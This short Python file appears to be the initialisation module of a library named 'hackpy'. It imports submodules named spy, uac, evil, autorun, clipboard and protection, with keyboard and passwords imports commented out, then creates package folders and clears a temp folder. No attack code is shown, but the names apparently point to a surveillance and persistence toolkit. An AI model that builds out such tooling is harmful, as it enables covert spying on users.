# Import hackpy modules
from hackpy.spy         import *
from hackpy.uac         import *
from hackpy.evil        import *
from hackpy.info        import *
from hackpy.file        import *
from hackpy.power       import *
from hackpy.admin       import *
from hackpy.python      import *
from hackpy.autorun     import *
from hackpy.modules     import *
from hackpy.network     import *
from hackpy.commands    import *
from hackpy.settings    import *
#from hackpy.keyboard   import *
from hackpy.clipboard   import *
from hackpy.activity    import *
#from hackpy.passwords  import *
from hackpy.protection  import *
from hackpy.messagebox  import *
from hackpy.taskmanager import *

# Create hackpy folders
for folder in ['', 'executable', 'tempdata']:
	if not file.exists(main_path + folder):
		file.mkdir(main_path + folder)

# Clean temp folder
for temp in file.scan(temp_path):
	try:
		file.remove(temp_path + temp)
	except:
		pass
